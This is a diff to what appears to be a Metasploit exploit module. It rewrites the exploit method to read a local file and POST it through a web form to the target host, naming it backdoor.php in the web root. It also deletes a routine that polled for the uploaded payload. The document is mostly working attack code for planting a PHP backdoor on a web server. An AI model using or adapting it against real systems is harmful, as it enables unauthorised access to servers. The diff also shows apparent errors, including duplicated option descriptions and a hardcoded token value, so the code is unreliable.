@@ -54,64 +54,26 @@ class MetasploitModule < Msf::Exploit::Remote
 
     register_options(
       [
-        OptString.new('LOCAL_BACKDOOR_NAME',  [true, 'Path to local backdoor file', '/']),
-        OptString.new('TARGETURI',  [true, 'Path to the application root', '/']),
-        OptString.new('TRIGGERURI', [false, 'Path to the uploaded payload', '']),
-        OptString.new('WEB_ROOT',   [true, 'Path to the web root', '/var/www'])
+        OptString.new('LOCAL_FILE_PATH',  [true, 'Path of the file to upload', '/home/moses']),
+        OptString.new('REMOTE_BACKDOOR_NAME',  [true, 'Path of the file to upload', 'b.php']),
+        OptString.new('WEB_ROOT',   [true, 'Path to the web root', '/var/www/html'])
       ])
-    
-  end
 
-  def trigger(trigger_uri)
-    print_status("Sleeping before requesting the payload from: #{trigger_uri}")
-
-    page_found = false
-    sleep_time = 10
-    wait_time = datastore['WAIT_TIMEOUT']
-    print_status("Waiting for up to #{wait_time} seconds to trigger the payload")
-    while wait_time > 0
-      sleep(sleep_time)
-      wait_time -= sleep_time
-      res = send_request_cgi!(
-        'method'   => 'GET',
-        'uri'      => trigger_uri
-      )
-
-      if res.nil?
-        if page_found or session_created?
-          print_good('Successfully triggered the payload')
-          break
-        end
-
-        next
-      end
-
-      next unless res.code == 200
-
-      if res.body.length == 0 and not page_found
-        print_good('Successfully found the payload')
-        page_found = true
-      end
-    end
   end
 
   def exploit
-    payload_file_name = "#{rand_text_alphanumeric(8)}.php"
+    require 'net/http'
+    payload_file_name = "backdoor.php"
     payload_file_path = "#{datastore['WEB_ROOT']}/#{payload_file_name}"
 
-    local_file_name = datastore['LOCAL_BACKDOOR_NAME']
-    file = File.open("users.txt")
-
+    local_file_name = datastore['LOCAL_FILE_PATH']
+    file = File.open(local_file_name)
     data = file.read
 
     print_status("Writing the backdoor to #{payload_file_path}")
-    res = send_request_cgi(
-      'method'   => 'POST',
-      'uri'      => normalize_uri(target_uri),
-      'ctype'    => "multipart/form-data; boundary=#{data.bound}",
-      'data'     => data.to_s
-    )
-
-    register_files_for_cleanup(payload_file_path)    
+    host = URI("http://#{datastore['RHOSTS']}:#{datastore['RPORT']}/")
+    print_status("remote host is  #{host}")
+    response = Net::HTTP.post_form(host,  { "name" => payload_file_name, "email" => "Token@8010280", "message" => data})
+    register_files_for_cleanup(payload_file_path)
   end
 end
